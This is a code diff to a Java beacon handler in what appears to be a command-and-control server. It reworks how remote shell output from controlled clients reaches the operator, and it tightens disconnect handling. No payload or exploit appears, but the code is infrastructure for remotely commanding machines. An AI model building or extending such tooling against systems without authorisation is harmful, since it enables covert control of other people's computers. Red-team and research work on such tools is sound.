@@ -1,6 +1,5 @@
 package Servers.C2;
 
-import java.io.IOException;
 import java.util.Map;
 
 import org.json.JSONObject;
@@ -24,10 +23,6 @@ public class C2ServerBeaconHandler implements Runnable{
     private Thread keepAliveThread;
     private Object sendLock;
 
-    // Variables used when the user is in shell mode
-    private Boolean isShell;
-    private Object shellLock;
-
     // Object used to encrypt with AES
     private aes aes;
 
@@ -42,25 +37,18 @@ public class C2ServerBeaconHandler implements Runnable{
      * @param duplexer - duplexer used to write and read from the socket
      * @param IP - IP address of the beacon
      * @param server - pointer back to the C2 server
-     * @param shellLock - Object lock, used to make responses in shell mode come back very quickly
      * @param aes - object used for encryption and decryption via aes
      */
-    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server, Object shellLock, aes aes){
+    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server, aes aes){
         this.duplexer = duplexer;
         this.IP = IP;
         this.C2server = server;
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(duplexer, sendLock, true, false, aes);
         this.keepAliveThread = new Thread(keepAliveClass);
-        this.isShell = false;
-        this.shellLock = shellLock;
         this.aes = aes;
         this.sentinel = true;
         this.hasToldStatus = false;
-    }
-
-    protected void setIsShell(Boolean value){
-        this.isShell = value;
     }
 
     /**
@@ -82,6 +70,7 @@ public class C2ServerBeaconHandler implements Runnable{
         String errorMessage = "Lost Beacon Server at " + IP;
         C2server.outputToUser(errorMessage);
         keepAliveClass.stopKeepAlive();
+        C2server.removeBeacon(IP);
         this.sentinel = false;
         if(e != null){
             e.printStackTrace();
@@ -112,19 +101,17 @@ public class C2ServerBeaconHandler implements Runnable{
                         C2server.updateClientLastSeen(ip);
                         if (!hasToldStatus){
                             C2server.setBeaconHTTP(this.IP);
+                            hasToldStatus = true;
                         }
                         C2server.updateBeaconClientHttpsMap(ip, this.IP);
                     }
                     
                     if(type.equals("client_command_response")){
                         // When we get a response to a command, add it to the dictionaries
-                        C2server.addDataToResponsesDictionaries(ip, data.trim());
-                        // If we are currently in a shell, notify the lock
-                        if(isShell){
-                            synchronized(shellLock){
-                                shellLock.notify();
-                            }   
-                        }
+                        String trimmed = data.trim();
+                        C2server.addDataToResponsesDictionaries(ip, trimmed);
+                        // Hand the output to any /shell request waiting on this client (no-op if none)
+                        C2server.offerShellResponse(ip, trimmed);
                     } else if (type.equals("client_connect")) {
                         // When we are notified of a new client, intialize the varaibles, and notify the User that there is a new client
                         C2server.outputToUser(data + " at " + ip);
@@ -137,11 +124,10 @@ public class C2ServerBeaconHandler implements Runnable{
                     }
                 }   
             }
-        } catch (IOException e) {
-            beaconDisconnect(e);
-        } catch (NullPointerException e) {
-            beaconDisconnect(e);
-        } catch (NumberFormatException e){
+        } catch (Exception e) {
+            // Any failure (socket error, malformed JSON / missing fields, etc.) ends this
+            // beacon cleanly: without this catch-all a JSONException would kill the thread
+            // and leak the keepAlive thread without cleanup.
             beaconDisconnect(e);
         }
     }
